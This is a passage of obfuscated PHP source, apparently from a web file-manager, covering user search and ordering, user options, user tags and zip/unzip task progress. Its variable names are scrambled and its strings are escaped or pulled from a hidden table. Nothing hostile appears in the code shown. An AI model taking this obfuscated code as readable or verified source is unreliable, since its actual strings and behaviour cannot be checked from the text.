(isset($Ùç‹µ¿¡[$ÓıíñÆ[815]])) { $­Õ–×ÊÁ[$ÓıíñÆ[2497]] = $Ùç‹µ¿¡[$ÓıíñÆ[815]]; } $äÍªîÔ¢ = $this->_makeOrder($êĞÏå¢)->field($ÓıíñÆ[2498])->where($­Õ–×ÊÁ)->join($çÛè¾ï¹)->selectPage(50); $this->_listDataApply($äÍªîÔ¢[$ÓıíñÆ[429]]); return $äÍªîÔ¢; } private function _makeOrder($‘øÖ“È = '') { $“È†£ôÀ =& $_SERVER[÷åé¼î]; $–èôŒÎğ = array($“È†£ôÀ[1779], $“È†£ôÀ[32], $“È†£ôÀ[1966], $“È†£ôÀ[2183], $“È†£ôÀ[1938], $“È†£ôÀ[231]); $…¼¦›áØ = array($“È†£ôÀ[507] => $“È†£ôÀ[508], $“È†£ôÀ[509] => $“È†£ôÀ[510]); $âØ¤ñãÊ = Input::get($“È†£ôÀ[514], $“È†£ôÀ[7], $“È†£ôÀ[1770], $–èôŒÎğ); $ë­’óƒ´ = Input::get($“È†£ôÀ[515], $“È†£ôÀ[7], $“È†£ôÀ[2072], array($“È†£ôÀ[2072], $“È†£ôÀ[509])); $ë­’óƒ´ = $…¼¦›áØ[$ë­’óƒ´]; $‘øÖ“È = $‘øÖ“È . "\165\x73\x65\x72\56{$âØ¤ñãÊ}\40{$ë­’óƒ´}\x2c\x20\165\x73\x65\162\56\x75\163\145\x72\x49\x44\40\141\x73\x63"; return $this->alias($“È†£ôÀ[2199])->order($‘øÖ“È); } public function listSearch($á®§È­’) { $¹±™ ”å =& $_SERVER[÷åé¼î]; $Àæó¥ìº = trim($á®§È­’[$¹±™ ”å[2075]]); $è½‚¦©ó = explode($¹±™ ”å[53], $Àæó¥ìº); if (!$Àæó¥ìº || count($è½‚¦©ó) == 1) { return $this->listSearchNow($á®§È­’); } $®Û‘ïÒí = array($¹±™ ”å[429] => array()); foreach ($è½‚¦©ó as $²ª»·Øˆ) { if (!trim($²ª»·Øˆ)) { continue; } $á®§È­’[$¹±™ ”å[2075]] = $²ª»·Øˆ; $ÒŞ±…ÜŒ = $this->listSearchNow($á®§È­’); $®Û‘ïÒí[$¹±™ ”å[429]] = array_merge($®Û‘ïÒí[$¹±™ ”å[429]], $ÒŞ±…ÜŒ[$¹±™ ”å[429]]); } $®Û‘ïÒí[$¹±™ ”å[429]] = array_unique_by_key($®Û‘ïÒí[$¹±™ ”å[429]], $¹±™ ”å[1779]); $®Û‘ïÒí[$¹±™ ”å[426]] = array($¹±™ ”å[427] => count($®Û‘ïÒí[$¹±™ ”å[429]]), $¹±™ ”å[423] => 20, $¹±™ ”å[413] => 1, $¹±™ ”å[428] => 1); return $®Û‘ïÒí; } public function listSearchNow($‡Îå—¸÷) { $»àÕœÏñ =& $_SERVER[÷åé¼î]; $Ïä‹¹¦ = trim($‡Îå—¸÷[$»àÕœÏñ[2075]]); $ğ–­òïÙ = isset($‡Îå—¸÷[$»àÕœÏñ[2076]]) ? $‡Îå—¸÷[$»àÕœÏñ[2076]] : !1; $Ïä‹¹¦ = str_replace($»àÕœÏñ[2077], $»àÕœÏñ[2078], trim($Ïä‹¹¦)); $à‰»ñ”ò = array($»àÕœÏñ[32] => array($»àÕœÏñ[443], "\45{$Ïä‹¹¦}\45"), $»àÕœÏñ[365] => array($»àÕœÏñ[443], "{$Ïä‹¹¦}\45"), $»àÕœÏñ[2265] => array($»àÕœÏñ[443], "{$Ïä‹¹¦}\45"), $»àÕœÏñ[1072] => $»àÕœÏñ[2079]); if (Input::check($Ïä‹¹¦, $»àÕœÏñ[371])) { $à‰»ñ”ò[$»àÕœÏñ[1779]] = array($»àÕœÏñ[443], "{$Ïä‹¹¦}\x25"); $à‰»ñ”ò[$»àÕœÏñ[2479]] = array($»àÕœÏñ[443], "{$Ïä‹¹¦}\45"); } if (!$Ïä‹¹¦) { $à‰»ñ”ò = array(); } if (isset($‡Îå—¸÷[$»àÕœÏñ[815]])) { $à‰»ñ”ò[$»àÕœÏñ[815]] = $‡Îå—¸÷[$»àÕœÏñ[815]]; } $à‰»ñ”ò = $this->parseWhereLike($à‰»ñ”ò); $¦èâË¯ = $this->_makeOrder()->where($à‰»ñ”ò)->selectPage(20); if (!$¦èâË¯ || count($¦èâË¯[$»àÕœÏñ[429]]) < 5 && Input::check($Ïä‹¹¦, $»àÕœÏñ[378])) { $ğ“²ÔÁ½ = $this->_searchFromMeta($»àÕœÏñ[521], $Ïä‹¹¦, 10); $ÛÕ¥“¼ = $this->_searchFromMeta($»àÕœÏñ[522], $Ïä‹¹¦, 10); $ê¥¾ª©÷ = array_merge($ğ“²ÔÁ½, $ÛÕ¥“¼, $¦èâË¯[$»àÕœÏñ[429]]); $¦èâË¯[$»àÕœÏñ[429]] = array_unique_by_key($ê¥¾ª©÷, $»àÕœÏñ[1779]); $¦èâË¯[$»àÕœÏñ[426]][$»àÕœÏñ[427]] = count($¦èâË¯[$»àÕœÏñ[429]]); $¦èâË¯[$»àÕœÏñ[426]][$»àÕœÏñ[428]] = ceil($¦èâË¯[$»àÕœÏñ[426]][$»àÕœÏñ[427]] / $¦èâË¯[$»àÕœÏñ[426]][$»àÕœÏñ[423]]); } $this->_listDataApply($¦èâË¯[$»àÕœÏñ[429]]); $this->_filterByGroup($¦èâË¯, $ğ–­òïÙ); return $¦èâË¯; } private function _filterByGroup(&$á·—ö¹ã, $ôŞœ§ôû) { $ÛÂÓ¼¤Ä =& $_SERVER[÷åé¼î]; if (!$ôŞœ§ôû) { return $á·—ö¹ã; } foreach ($á·—ö¹ã[$ÛÂÓ¼¤Ä[429]] as $®‹êÍ¾¾ => &$©õÜÒõ) { $º€«åş‹ = array_to_keyvalue($©õÜÒõ[$ÛÂÓ¼¤Ä[2168]], $ÛÂÓ¼¤Ä[12], $ÛÂÓ¼¤Ä[1977]); if (!in_array($ôŞœ§ôû, $º€«åş‹)) { unset($á·—ö¹ã[$ÛÂÓ¼¤Ä[429]][$®‹êÍ¾¾]); } } unset($©õÜÒõ); $á·—ö¹ã[$ÛÂÓ¼¤Ä[429]] = array_values($á·—ö¹ã[$ÛÂÓ¼¤Ä[429]]); $á·—ö¹ã[$ÛÂÓ¼¤Ä[426]] = array($ÛÂÓ¼¤Ä[2235] => count($á·—ö¹ã[$ÛÂÓ¼¤Ä[429]]), $ÛÂÓ¼¤Ä[2233] => $á·—ö¹ã[$ÛÂÓ¼¤Ä[426]][$ÛÂÓ¼¤Ä[423]], $ÛÂÓ¼¤Ä[2232] => 1, $ÛÂÓ¼¤Ä[2234] => 1); } private function _searchFromMeta($Ç”…–…¾, $—ÎÕ¹‘¶, $ª«ª¨Å) { $ĞÃä¿« =& $_SERVER[÷åé¼î]; $—ÎÕ¹‘¶ = strtolower($—ÎÕ¹‘¶); $ˆ€‡é— = array($ĞÃä¿«[97] => $Ç”…–…¾, $ĞÃä¿«[434] => array($ĞÃä¿«[443], "\x25{$—ÎÕ¹‘¶}\x25")); $ˆ€‡é— = $this->parseWhereLike($ˆ€‡é—); $û£ÈÄ¨÷ = Model($ĞÃä¿«[2499])->where($ˆ€‡é—)->limit($ª«ª¨Å)->select(); if (!$û£ÈÄ¨÷) { return array(); } $û£ÈÄ¨÷ = array_to_keyvalue($û£ÈÄ¨÷, $ĞÃä¿«[12], $ĞÃä¿«[1779]); $¨¥¾Ö’ü = $this->where(array($ĞÃä¿«[1770] => array($ĞÃä¿«[7], $û£ÈÄ¨÷)))->select(); if (!$¨¥¾Ö’ü) { return array(); } return $¨¥¾Ö’ü; } private function _listDataApplyItem($…Ä¡çª¶) { $À­ôŠéÂ = array($…Ä¡çª¶); $this->_listDataApply($À­ôŠéÂ); return $À­ôŠéÂ[0]; } private function _listDataApply(&$ ÏÓ·ÑŸ) { $£“Ş“ŸÖ =& $_SERVER[÷åé¼î]; if (!$ ÏÓ·ÑŸ) { return; } array_remove_key($ ÏÓ·ÑŸ, $£“Ş“ŸÖ[961]); $æàÎÖÔº = array_to_keyvalue($ ÏÓ·ÑŸ, $£“Ş“ŸÖ[12], $£“Ş“ŸÖ[1779]); $this->_listAppendGroup($ ÏÓ·ÑŸ, $æàÎÖÔº); $this->_listAppendMeta($ ÏÓ·ÑŸ, $æàÎÖÔº); $this->_listAppendSourceRoot($ ÏÓ·ÑŸ, $æàÎÖÔº); } private function _listAppendSourceRoot(&$òêŸ”«â, $êœÕÇ˜•) { $ó‹ÔÎÄß =& $_SERVER[÷åé¼î]; $°ğúñ× = Model($ó‹ÔÎÄß[889])->listSourceRoot(SourceModel::TYPE_USER, $êœÕÇ˜•); $°ğúñ× = array_to_keyvalue($°ğúñ×, $ó‹ÔÎÄß[553]); $°ğúñ× = array_remove_key($°ğúñ×, $ó‹ÔÎÄß[553]); foreach ($òêŸ”«â as &$¦¤¥Ùì) { $¦¤¥Ùì[$ó‹ÔÎÄß[90]] = $°ğúñ×[$¦¤¥Ùì[$ó‹ÔÎÄß[1779]]] ? $°ğúñ×[$¦¤¥Ùì[$ó‹ÔÎÄß[1779]]] : array(); } unset($¦¤¥Ùì); } private function _listAppendGroup(&$í ÅŞá², $½Øªœ¨£) { $’îÃó¼× =& $_SERVER[÷åé¼î]; $¯¡°‘•å = array($’îÃó¼×[1779] => array($’îÃó¼×[7], $½Øªœ¨£)); $ı„äÅÉ = Model($’îÃó¼×[2071])->where($¯¡°‘•å)->select(); $ªÍ¿õÎ² = array_to_keyvalue($ı„äÅÉ, $’îÃó¼×[12], $’îÃó¼×[1977]); $ªÍ¿õÎ² = array_remove_value(array_unique($ªÍ¿õÎ²), $’îÃó¼×[228]); if (!$ªÍ¿õÎ² || !$ı„äÅÉ) { return; } $¯¡°‘•å = array($’îÃó¼×[1977] => array($’îÃó¼×[7], $ªÍ¿õÎ²)); $Ê›ø„¾ = Model($’îÃó¼×[2166])->field($’îÃó¼×[2500])->where($¯¡°‘•å)->select(); $Ê›ø„¾ = array_to_keyvalue($Ê›ø„¾, $’îÃó¼×[1977]); $ı„äÅÉ = array_to_keyvalue_group($ı„äÅÉ, $’îÃó¼×[1779]); foreach ($ı„äÅÉ as &$–Ä“Åş) { $ó×‡ú½® = array(); foreach ($–Ä“Åş as $Ğ³ƒÊîê) { if (!$Ğ³ƒÊîê[$’îÃó¼×[2085]]) { continue; } $İãè²İ¦ = Model($’îÃó¼×[555])->listData($Ğ³ƒÊîê[$’îÃó¼×[2085]]); $ó×‡ú½®[] = array($’îÃó¼×[1977] => $Ğ³ƒÊîê[$’îÃó¼×[1977]], $’îÃó¼×[2501] => $Ê›ø„¾[$Ğ³ƒÊîê[$’îÃó¼×[1977]]][$’îÃó¼×[32]], $’îÃó¼×[568] => $Ê›ø„¾[$Ğ³ƒÊîê[$’îÃó¼×[1977]]][$’îÃó¼×[568]], $’îÃó¼×[471] => $İãè²İ¦); } $–Ä“Åş = $ó×‡ú½®; } unset($–Ä“Åş); foreach ($í ÅŞá² as &$’‚ ´ÏÍ) { $’‚ ´ÏÍ[$’îÃó¼×[2168]] = array(); if (isset($ı„äÅÉ[$’‚ ´ÏÍ[$’îÃó¼×[1779]]])) { $’‚ ´ÏÍ[$’îÃó¼×[2168]] = $ı„äÅÉ[$’‚ ´ÏÍ[$’îÃó¼×[1779]]]; } } unset($’‚ ´ÏÍ); } public function userAppendGroup($é…ş Åı) { $²Ç¯¥è =& $_SERVER[÷åé¼î]; if (!$é…ş Åı) { return array(); } $this->_listAppendGroup($é…ş Åı, array_to_keyvalue($é…ş Åı, $²Ç¯¥è[12], $²Ç¯¥è[1779])); return $é…ş Åı; } private function _listAppendMeta(&$ğ®İ¯¬, $ó“’”) { $´ğ™ı‡ =& $_SERVER[÷åé¼î]; $šëĞˆó = UserJobModel::JOB_KEY; $£šÎó…Ï = array($´ğ™ı‡[2480]); $ˆƒãöáÒ = array($´ğ™ı‡[1779] => array($´ğ™ı‡[7], $ó“’”)); $¤¿ÙÍâ¡ = Model($´ğ™ı‡[2478])->where($ˆƒãöáÒ)->select(); $¤¿ÙÍâ¡ = array_to_keyvalue_group($¤¿ÙÍâ¡, $´ğ™ı‡[1779]); foreach ($¤¿ÙÍâ¡ as &$ç§×™Å¹) { $’Õ¶•Öø = array(); foreach ($ç§×™Å¹ as $™Û¯ÌØ³) { if (!in_array($™Û¯ÌØ³[$´ğ™ı‡[97]], $£šÎó…Ï)) { $’Õ¶•Öø[$™Û¯ÌØ³[$´ğ™ı‡[97]]] = $™Û¯ÌØ³[$´ğ™ı‡[434]]; } } $ç§×™Å¹ = $’Õ¶•Öø; } unset($ç§×™Å¹); $Å¹¦Ïôù = Model($´ğ™ı‡[2502]); foreach ($ğ®İ¯¬ as &$°°È±†á) { $Â‰›Æ› = array(); if (isset($¤¿ÙÍâ¡[$°°È±†á[$´ğ™ı‡[1779]]])) { $Â‰›Æ› = $¤¿ÙÍâ¡[$°°È±†á[$´ğ™ı‡[1779]]]; } $°°È±†á[$´ğ™ı‡[2503]] = array(); if (isset($Â‰›Æ›[$šëĞˆó])) { $°°È±†á[$´ğ™ı‡[2503]] = $Å¹¦Ïôù->getUserJobInfo($Â‰›Æ›[$šëĞˆó]); } } unset($°°È±†á); } protected function groupUserAll($‡‹é·ÑÉ) { $¹©Ú½ö† =& $_SERVER[÷åé¼î]; if (!$‡‹é·ÑÉ) { return !1; } $‘ò¹º¿ğ = Model($¹©Ú½ö†[2071])->field($¹©Ú½ö†[1779])->where(array($¹©Ú½ö†[1977] => array($¹©Ú½ö†[7], $‡‹é·ÑÉ)))->select(); $‘ò¹º¿ğ = array_to_keyvalue($‘ò¹º¿ğ, $¹©Ú½ö†[12], $¹©Ú½ö†[1779]); return array_unique($‘ò¹º¿ğ); } public function userSearch($÷„²Ûõ, $÷ÅáÉõ = "\52") { return Model($_SERVER[÷åé¼î][582])->where($÷„²Ûõ)->field($÷ÅáÉõ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\145\x72\x5f\x6f\x70\x74\x69\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($äÙ”ôàÓ) { $ äúê„© =& $_SERVER[÷åé¼î]; $â‡Ñ‰ù = defined($ äúê„©[2203]) && USER_ID ? USER_ID : $ äúê„©[12]; return "\125\x73\x65\162\x4f\x70\164\151\x6f\156\137{$äÙ”ôàÓ}\x5f" . $â‡Ñ‰ù; } protected function filterWhere($€Ñ«¾¨³) { $Ü€–—Ä =& $_SERVER[÷åé¼î]; $€Ñ«¾¨³[$Ü€–—Ä[1779]] = defined($Ü€–—Ä[2203]) && USER_ID ? USER_ID : $Ü€–—Ä[12]; return $€Ñ«¾¨³; } public function cacheRemoveUser($é¡çÍ¢«, $–¸â„Ğ) { return Cache::remove("\125\x73\145\x72\x4f\x70\x74\x69\x6f\156\x5f{$é¡çÍ¢«}\137" . $–¸â„Ğ); } protected function optionDefault($Ò¡—‡Ãé = '') { $©÷Øş†Ñ =& $_SERVER[÷åé¼î]; if ($Ò¡—‡Ãé == $©÷Øş†Ñ[12]) { return $GLOBALS[$©÷Øş†Ñ[6]][$©÷Øş†Ñ[2504]]; } if ($Ò¡—‡Ãé == $©÷Øş†Ñ[2505]) { return $GLOBALS[$©÷Øş†Ñ[6]][$©÷Øş†Ñ[2506]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\141\147\x4c\151\x73\164"; public $modelType = "\x55\163\x65\162\117\x70\x74\151\157\156"; public $field = array("\156\x61\x6d\145", "\x73\x74\171\x6c\145", "\163\157\162\164"); public function listData($çÕÃ‹Õ = false, $÷ç€à‰ = "\163\x6f\162\x74", $ùàó¤“ = false) { return parent::listData($çÕÃ‹Õ, $÷ç€à‰, $ùàó¤“); } public function remove($½·üİË) { return parent::remove($½·üİË); } public function add($¤²¶ş‡Â, $•óéáœ‰ = "\154\x61\x62\145\154\x2d\147\x72\145\x79\55\x6e\157\162\155\141\x6c") { $á’Æá¯ =& $_SERVER[÷åé¼î]; if ($this->findByName($¤²¶ş‡Â)) { return !1; } $à…—ğÊ = array($á’Æá¯[478] => $¤²¶ş‡Â, $á’Æá¯[542] => $•óéáœ‰, $á’Æá¯[1981] => $this->getSort($á’Æá¯[319]) + 1); return parent::insert($à…—ğÊ); } public function update($ÓĞìşºÛ, $Š¡ÇÆÁÚ) { $ü¡¥‹œú =& $_SERVER[÷åé¼î]; $ÆÅ© ØÒ = $this->listData($ÓĞìşºÛ); $ÂÈ‹„òÜ = $this->findByName($Š¡ÇÆÁÚ[$ü¡¥‹œú[32]]); if (!$ÆÅ© ØÒ || $ÂÈ‹„òÜ && $ÂÈ‹„òÜ[$ü¡¥‹œú[459]] != $ÆÅ© ØÒ[$ü¡¥‹œú[459]]) { return !1; } return parent::update($ÓĞìşºÛ, $Š¡ÇÆÁÚ); } public function moveTop($µèñ’) { $‰§Ìüã¨ =& $_SERVER[÷åé¼î]; $Á¯Ü¯ı = parent::listData(); $®šåŒï© = $this->getSort($‰§Ìüã¨[318]); foreach ($Á¯Ü¯ı as &$–Šé¢°) { if ($–Šé¢°[$‰§Ìüã¨[459]] == $µèñ’) { $–Šé¢°[$‰§Ìüã¨[2001]] = $®šåŒï©; continue; } $–Šé¢°[$‰§Ìüã¨[2001]] += 1; } unset($–Šé¢°); return parent::resetData($Á¯Ü¯ı); } public function moveBottom($„ÉÆŸµ¥) { $ ¶­ê¢Î =& $_SERVER[÷åé¼î]; $îíø¾Äç = $this->getSort($ ¶­ê¢Î[319]) + 1; return parent::update($„ÉÆŸµ¥, array($ ¶­ê¢Î[2001] => $îíø¾Äç)); } public function resetSort($Êë“ÍÛë) { $ÙØ×® =& $_SERVER[÷åé¼î]; $¬ëÚÏä¥ = array(); $Êë“ÍÛë = is_array($Êë“ÍÛë) ? $Êë“ÍÛë : array(); for ($Èšª™Ñ¶ = 0; $Èšª™Ñ¶ < count($Êë“ÍÛë); $Èšª™Ñ¶++) { $¬ëÚÏä¥[$Êë“ÍÛë[$Èšª™Ñ¶] . $ÙØ×®[12]] = $Èšª™Ñ¶ + 1; } $Š¤òø¢ = parent::listData(); foreach ($Š¤òø¢ as &$Íİ¿âÇø) { $ø®ŒÃŞı = $¬ëÚÏä¥[$Íİ¿âÇø[$ÙØ×®[459]]]; $Íİ¿âÇø[$ÙØ×®[2001]] = $ø®ŒÃŞı ? $ø®ŒÃŞı : $Íİ¿âÇø[$ÙØ×®[2001]]; } unset($Íİ¿âÇø); return parent::resetData($Š¤òø¢); } private function getSort($ş÷¢¦İ—) { $·Ìê‰‚´ =& $_SERVER[÷åé¼î]; $İÏŞìÉÏ = parent::listData(); $‡¨ô»”Ä = array_to_keyvalue($İÏŞìÉÏ, $·Ìê‰‚´[12], $·Ìê‰‚´[2001]); if (!$‡¨ô»”Ä) { $‡¨ô»”Ä = array(0); } $ì€¾ˆí€ = $ş÷¢¦İ— == $·Ìê‰‚´[319] ? max($‡¨ô»”Ä) : min($‡¨ô»”Ä); return intval($ì€¾ˆí€); } } goto c¨‚ôæ¤; FĞô‰ã«Ô: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $¹†¯©ô =& $_SERVER[÷åé¼î]; parent::startAfter(); Hook::bind($¹†¯©ô[1892], array($this, $¹†¯©ô[1893])); Hook::bind($¹†¯©ô[1272], array($this, $¹†¯©ô[1894])); Hook::bind($¹†¯©ô[1895], array($this, $¹†¯©ô[1896])); $¢àµ¿ß€ =& $this->task; $¢àµ¿ß€[$¹†¯©ô[1897]] = $¹†¯©ô[1273]; if (!$¢àµ¿ß€[$¹†¯©ô[1668]]) { $¢àµ¿ß€[$¹†¯©ô[1668]] = LNG($¹†¯©ô[1898]); } } protected function endAfter() { $ ¤­éù =& $_SERVER[÷åé¼î]; parent::endAfter(); Hook::unbind($ ¤­éù[1892], array($this, $ ¤­éù[1893])); Hook::unbind($ ¤­éù[1272], array($this, $ ¤­éù[1894])); Hook::unbind($ ¤­éù[1895], array($this, $ ¤­éù[1896])); } public function updateAfter() { $™Ğâ™Ğ— =& $_SERVER[÷åé¼î]; $èªÏ˜ÜŠ =& $this->task; if (!$èªÏ˜ÜŠ[$™Ğâ™Ğ—[1135]] || !$èªÏ˜ÜŠ[$™Ğâ™Ğ—[828]]) { if ($èªÏ˜ÜŠ[$™Ğâ™Ğ—[1897]] != $™Ğâ™Ğ—[373]) { return; } } if ($èªÏ˜ÜŠ[$™Ğâ™Ğ—[1897]] == $™Ğâ™Ğ—[1273]) { $€¥ÑÑÚ = 0; if ($èªÏ˜ÜŠ[$™Ğâ™Ğ—[1832]]) { $€¥ÑÑÚ = $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1833]] / $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1832]]; } $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1781]] = $€¥ÑÑÚ * 0.3; } else { if ($èªÏ˜ÜŠ[$™Ğâ™Ğ—[1897]] == $™Ğâ™Ğ—[373]) { $€¥ÑÑÚ = $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1780]] / $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1135]]; $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1781]] = 0.3 + $€¥ÑÑÚ * 0.4; } else { if ($èªÏ˜ÜŠ[$™Ğâ™Ğ—[1897]] == $™Ğâ™Ğ—[110]) { $û«±ÔÇ = 0; if ($èªÏ˜ÜŠ[$™Ğâ™Ğ—[1834]] == $™Ğâ™Ğ—[110]) { $û«±ÔÇ = $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1833]]; } $€¥ÑÑÚ = ($èªÏ˜ÜŠ[$™Ğâ™Ğ—[1837]] + $û«±ÔÇ) / $èªÏ˜ÜŠ[$™Ğâ™Ğ—[828]]; $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1781]] = 0.3 + 0.4 + $€¥ÑÑÚ * 0.3; } } } if ($èªÏ˜ÜŠ[$™Ğâ™Ğ—[1781]] > 0) { $ˆ×î›´¯ = timeFloat() - $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1783]] - $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1786]]; $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1787]] = $ˆ×î›´¯ * (1 - $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1781]]) / $èªÏ˜ÜŠ[$™Ğâ™Ğ—[1781]]; } } public function addFile($£¬à€Ÿæ) { $‹ŒêôÒş =& $_SERVER[÷åé¼î]; $õÑ½ªÎÄ =& $this->task; $ú¢÷“Å = IO::info($£¬à€Ÿæ); $õÑ½ªÎÄ[$‹ŒêôÒş[1830]] = $ú¢÷“Å[$‹ŒêôÒş[32]]; $õÑ½ªÎÄ[$‹ŒêôÒş[1832]] = $ú¢÷“Å[$‹ŒêôÒş[79]]; $õÑ½ªÎÄ[$‹ŒêôÒş[1833]] = 0; $õÑ½ªÎÄ[$‹ŒêôÒş[1137]] = $‹ŒêôÒş[1853]; $õÑ½ªÎÄ[$‹ŒêôÒş[1834]] = $‹ŒêôÒş[1273]; $õÑ½ªÎÄ[$‹ŒêôÒş[828]] = $ú¢÷“Å[$‹ŒêôÒş[79]]; $õÑ½ªÎÄ[$‹ŒêôÒş[1135]] = 1; $êü“Øğ‰ = 0; $õÑ½ªÎÄ[$‹ŒêôÒş[1841]] = array($‹ŒêôÒş[1842] => $êü“Øğ‰ + 1, $‹ŒêôÒş[478] => $ú¢÷“Å[$‹ŒêôÒş[32]], $‹ŒêôÒş[87] => $ú¢÷“Å[$‹ŒêôÒş[87]], $‹ŒêôÒş[566] => $ú¢÷“Å[$‹ŒêôÒş[566]] ? $ú¢÷“Å[$‹ŒêôÒş[566]] : $ú¢÷“Å[$‹ŒêôÒş[87]]); $this->update(); } public function zipEvent($ÔÌ£¦ó®, $²—ãÛÏ¬, $‡İóî«, $œ´óö­Á) { $±üö³ë =& $_SERVER[÷åé¼î]; $ì—ñ£ı’ =& $this->task; $ì—ñ£ı’[$±üö³ë[1830]] = get_path_this($²—ãÛÏ¬); $ì—ñ£ı’[$±üö³ë[1832]] = $œ´óö­Á; $ì—ñ£ı’[$±üö³ë[1833]] = $‡İóî«; $ì—ñ£ı’[$±üö³ë[1137]] = $ÔÌ£¦ó® == $±üö³ë[1899] ? $±üö³ë[1900] : $±üö³ë[1901]; $ì—ñ£ı’[$±üö³ë[1834]] = $±üö³ë[12]; $ì—ñ£ı’[$±üö³ë[828]] = $œ´óö­Á; $ì—ñ£ı’[$±üö³ë[1897]] = $±üö³ë[373]; $this->update(); } public function unzipAfter($”ù›™Â›) { $ƒ›”æ· =& $_SERVER[÷åé¼î]; $çíºå…Ø =& $this->task; $çíºå…Ø[$ƒ›”æ·[1897]] = $ƒ›”æ·[110]; $’ï—¼èú = IO::infoWithChildren($”ù›™Â›); $š£‡‘†  = 0; $çíºå…Ø[$ƒ›”æ·[1841]] = array($ƒ›”æ·[1842] => $š£‡‘†  + 1, $ƒ›”æ·[478] => $’ï—¼èú[$ƒ›”æ·[32]], $ƒ›”æ·[87] => $’ï—¼èú[$ƒ›”æ·[87]], $ƒ›”æ·[566] => $’ï—¼èú[$ƒ›”æ·[566]] ? $’ï—¼èú[$ƒ›”æ·[566]] : $’ï—¼èú[$ƒ›”æ·[87]]); if ($’ï—¼èú[$ƒ›”æ·[33]] == $ƒ›”æ·[230]) { $çíºå…Ø[$ƒ›”æ·[1135]] = 1; } else { $çíºå…Ø[$ƒ›”æ·[1135]] = $’ï—¼èú[$ƒ›”æ·[82]][$ƒ›”æ·[80]]; } $çíºå…Ø[$ƒ›”æ·[1137]] = $ƒ›”æ·[12]; $çíºå…Ø[$ƒ›”æ·[1834]] = 0; $çíºå…Ø[$ƒ›”æ·[1780]] = 0; $çíºå…Ø[$ƒ›”æ·[1832]] = 0; $çíºå…Ø[$ƒ›”æ·[1833]] = 0; $çíºå…Ø[$ƒ›”æ·[1830]] = $ƒ›”æ·[12]; $çíºå…Ø[$ƒ›”æ·[1837]] = 0; $çíºå…Ø[$ƒ›”æ·[828]] = $’ï—¼èú[$ƒ›”æ·[79]]; $this->update(); self::log($ƒ›”æ·[1902] . json_encode(array($çíºå…Ø, $’ï—¼èú))); } public function nameParse($ã‹¡üÕ‹) { $Ã´Œâªß =& $_SERVER[÷åé¼î]; $Şâ³“òç =& $this->task; if ($Şâ³“òç[$Ã´Œâªß[1897]] == $Ã´Œâªß[1273]) { $Şâ³“òç[$Ã´Œâªß[1897]] = $Ã´Œâªß[373]; $Şâ³“òç[$Ã´Œâªß[1837]] = 0; $Şâ³“òç[$Ã´Œâªß[828]] = 0; } $ê•³ëğ¼ = get_path_this($ã‹¡üÕ‹); if (strstr($ê•³ëğ¼, $Ã´Œâªß[10])) { $Şâ³“òç[$Ã´Œâªß[1780]] += 1; $Şâ³“òç[$Ã´Œâªß[1135]] += 1; } $Şâ³“òç[$Ã´Œâªß[1830]] = $ã‹¡üÕ‹; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $çÑ‚Ü–ğ =& $_SERVER[÷åé¼î]; parent::startAfter(); Hook::bind($çÑ‚Ü–ğ[1903], array($this, $çÑ‚Ü–ğ[1893])); Hook::bind($çÑ‚Ü–ğ[1895], array($this, $çÑ‚Ü–ğ[1896])); $ªõß„„Ü =& $this->task; $ªõß„„Ü[$çÑ‚Ü–ğ[1897]] = $çÑ‚Ü–ğ[1273]; if (!$ªõß„„Ü[$çÑ‚Ü–ğ[1668]]) { $ªõß„„Ü[$çÑ‚Ü–ğ[1668]] = LNG($çÑ‚Ü–ğ[1904]); } } protected function endAfter() { $Õ–£ª¼˜ =& $_SERVER[÷åé¼î]; parent::endAfter(); Hook::unbind($Õ–£ª¼˜[1903], array($this, $Õ–£ª¼˜[1893])); Hook::unbind($Õ–£ª¼˜[1895], array($this, $Õ–£ª¼˜[1896])); } public function updateAfter() { $š¸º£¿¸ =& $_SERVER[÷åé¼î]; $¯€¿‹Œğ =& $this->task; if (!$¯€¿‹Œğ[$š¸º£¿¸[1135]] || !$¯€¿‹Œğ[$š¸º£¿¸[828]]) { return; } if ($¯€¿‹Œğ[$š¸º£¿¸[1897]] == $š¸º£¿¸[1273]) { $÷Ñ¤óâ× = $¯€¿‹Œğ[$š¸º£¿¸[1833]]; if ($¯€¿‹Œğ[$š¸º£¿¸[1834]] != $š¸º£¿¸[1273]) { $÷Ñ¤óâ× = 0; } $–÷Îù¨ì = ($¯€¿‹Œğ[$š¸º£¿¸[1837]] + $÷Ñ¤óâ×) / $¯€¿‹Œğ[$š¸º£¿¸[828]]; $¯€¿‹Œğ[$š¸º£¿¸[1781]] = $–÷Îù¨ì * 0.3; } else { if ($¯€¿‹Œğ[$š¸º£¿¸[1897]] == $š¸º£¿¸[373]) { $–÷Îù¨ì = $¯€¿‹Œğ[$š¸º£¿¸[1780]] / $¯€¿‹Œğ[$š¸º£¿¸[1135]]; $¯€¿‹Œğ[$š¸º£¿¸[1781]] = 0.3 + $–÷Îù¨ì * 0.5; } else { if ($¯€¿‹Œğ[$š¸º£¿¸[1897]] == $š¸º£¿¸[110]) { $–÷Îù¨ì = 0; if ($¯€¿‹Œğ[$š¸º£¿¸[1832]]) { $–÷Îù¨ì = $¯€¿‹Œğ[$š¸º£¿¸[1833]] / $¯€¿‹Œğ[$š¸º£¿¸[1832]]; } $¯€¿‹Œğ[$š¸º£¿¸[1781]] = 0.3 + 0.5 + $–÷Îù¨ì * 0.2; } } } if ($¯€¿‹Œğ[$š¸º£¿¸[1781]] > 0) { $àÔ„ò• = timeFloat() - $¯€¿‹Œğ[$š¸º£¿¸[1783]] - $¯€¿‹Œğ[$š¸º£¿¸[1786]]; $¯€¿‹Œğ[$š¸º£¿¸[1787]] = $àÔ„ò• * (1 - 